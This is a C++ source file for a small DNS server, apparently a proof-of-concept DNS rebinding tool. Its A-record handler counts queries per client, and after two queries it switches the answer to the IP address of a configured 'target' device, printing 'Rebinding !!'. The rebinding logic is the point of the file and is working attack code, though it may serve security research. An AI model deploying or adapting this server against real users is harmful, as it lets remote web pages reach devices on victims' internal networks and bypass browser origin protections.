#include <array>
#include <string>
#include <iostream>
#include <fstream>

#include "resolver.hpp"
#include "query.hpp"
#include "response.hpp"
#include "server.hpp"

static constexpr int NUMBER_OF_TRIALS_BEFORE_REBINDING = 2;

namespace
{
    /**
     *  Helper function to turn a stringified ip address to
     *  a 32 bits number stored in a 4 bytes array.
     */
    inline std::array<uint8_t, 4> ip_string_to_int(std::string ip_address)
    {
        std::array<uint8_t, 4> ip;

        int i = 0;
        int pos;

        // Reversing IP bytes
        while ((pos = ip_address.find('.')) != std::string::npos)
        {
            ip[i] = static_cast<uint8_t>(std::stoi(ip_address.substr(0, pos)));
            ++i;
            ip_address.erase(0, pos + 1);
        }
        ip[i] = static_cast<uint8_t>(std::stoi(ip_address.substr(pos + 1)));

        return ip;
    }
}

namespace dns
{

bool Resolver::init(const std::string& filename, std::string & error_output) noexcept
{
    std::string text("Resolver::init() | filename: ");
    text += filename;

    std::ifstream file(filename.data());

    if (!file) {

        std::string text("Could not open file: ");
        text += filename;

        error_output = std::move(text);
        return false;
    }

    std::string line;
    while (!file.eof())
    {

        getline(file, line);
        store(line);
    }

    file.close();

    print_records();
    return true;
}

void Resolver::store(const std::string& line) noexcept {

    std::string::size_type ipAddresEndPos = line.find_first_of(" ");
    if (ipAddresEndPos == std::string::npos)
    {
        return;
    }

    std::string::size_type domain_name_start_pos = line.find_last_of(" ");

    if (domain_name_start_pos == std::string::npos)
    {
        return;
    }

    domain_name_start_pos += 1;

    std::string ip_address(line, 0, ipAddresEndPos);
    std::string domain_name(line, domain_name_start_pos, line.length());

    if (domain_name == "target")
    {
        target_record_ = Record(ip_address, domain_name);
        return ;
    }

    record_list_.emplace_back(Record(ip_address, domain_name));
}

void Resolver::print_records() noexcept {

    for (auto && record : record_list_)
    {
        std::cout << "Record: " << record.ip_address;
        std::cout << " - " << record.domain_name << '\n';
    }
}

void Resolver::process(const Query& query, Response& response, std::string const & client_ip) noexcept
{

    if (query.type() == static_cast<RecordType>(RecordType::AAAA))
        return ;
    std::string qName = query.name();

    std::string ip_address;
    std::string domain_name;

    response.init_response_with_query(query);


    if (RECORDS_HANDLERS.find(static_cast<RecordType>(query.type())) == RECORDS_HANDLERS.end())
    {
        response.fill_not_implemented();
        return ;
    }
    auto record_handler = RECORDS_HANDLERS.at(static_cast<RecordType>(query.type()));
    bool res = record_handler(this, query, response, client_ip);

    if (res == false)
    {
        std::cout << "[E] Do not know name [" << query.name() << "] \n";
        response.fill_name_error();

        return ;  
    }

    response.rcode(Response::Code::OK);

}

const std::string Resolver::find_domain_from_ip(const std::string& ip_address)
{
    std::string domain_name;

    for (auto && record : record_list_)
    {
        if (record.ip_address == ip_address) {
            domain_name = record.domain_name;
            break;
        }

    }

    return domain_name;
}

const std::string Resolver::find_ip_from_domain(const std::string& domain_name)
{
    std::string ip_address;

    for (auto && record : record_list_)
    {
        if (record.domain_name == domain_name) {
            ip_address = record.ip_address;
            break;
        }

    }

    return ip_address;
}

std::string Resolver::extract_ip(const std::string& query_name)
{
    
    int pos = query_name.find(".in-addr.arpa");

    if (pos == std::string::npos)
    {
        return std::string();
    }

    std::string tmp(query_name, 0, pos);
    std::string ip_address;

    ip_address.reserve(tmp.size());

    // Reversing IP bytes
    while ((pos = tmp.rfind('.')) != std::string::npos)
    {
        ip_address.append(tmp, pos+1, tmp.size());
        ip_address.append(".");
        tmp.erase(pos, tmp.size());
    }
    ip_address.append(tmp, 0, tmp.size());

    return ip_address;
}


/****************************************************/
/*                                                  */
/*  Handlers                                        */
/*                                                  */
/****************************************************/

bool Resolver::not_implemented(const Query& query, Response& response, std::string const &)
{
    std::cerr << "Do not handle type [" << query.type() << "]\n";
    response.fill_not_implemented();
    return true;
}


bool Resolver::a_record_handler(const Query& query, Response& response, std::string const & client_ip)
{
    std::string ip_address;
    std::string domain_name;

    domain_name = query.name();
    ip_address = find_ip_from_domain(domain_name);

    if (ip_address.empty())
    {
        std::cout << "xx Error: Could not find " << domain_name << '\n';
        return false;
    }

    char data[4];

    try
    {
        std::array<uint8_t, 4> ip_array;

        std::string sent_ip;

        // Test rebinding
        if (server_->clients().at(client_ip) > NUMBER_OF_TRIALS_BEFORE_REBINDING)
        {
            std::cout << "\n\nRebinding !!\n\n";

            // Change the IP to the target device
            ip_array = ip_string_to_int(target_record_.ip_address);
            sent_ip = target_record_.ip_address;
        }
        else
        {
            ip_array = ip_string_to_int(ip_address);
            sent_ip = ip_address;
        }

        std::cout << server_->clients().at(client_ip) << " -- sending ip: " << sent_ip << '\n';

        for (int i = 0; i < 4; ++i) data[i] = static_cast<char>(ip_array[i]);
    }
    catch (std::exception const & e)
    {
        std::cout << "Error for " << domain_name << " -- " << ip_address << " : " << e.what() << '\n';
        return false;
    }

    std::string test(data, 4);
    response.rdata(test);
    response.rd_length(4);

    return true;
}

// Unhandled
bool Resolver::aaaa_record_handler(const Query& query, Response& response, std::string const & client_ip)
{
    return false;
}

bool Resolver::ptr_record_handler(const Query& query, Response& response, std::string const & client_ip)
{
    std::string ip_address;
    std::string domain_name;

    ip_address = extract_ip(query.name());
    domain_name = find_domain_from_ip(ip_address);

    if (ip_address.empty())
    {
        return false;
    }
    response.rdata(domain_name);
    response.rd_length(domain_name.size() + 2);

    return true;
}


}
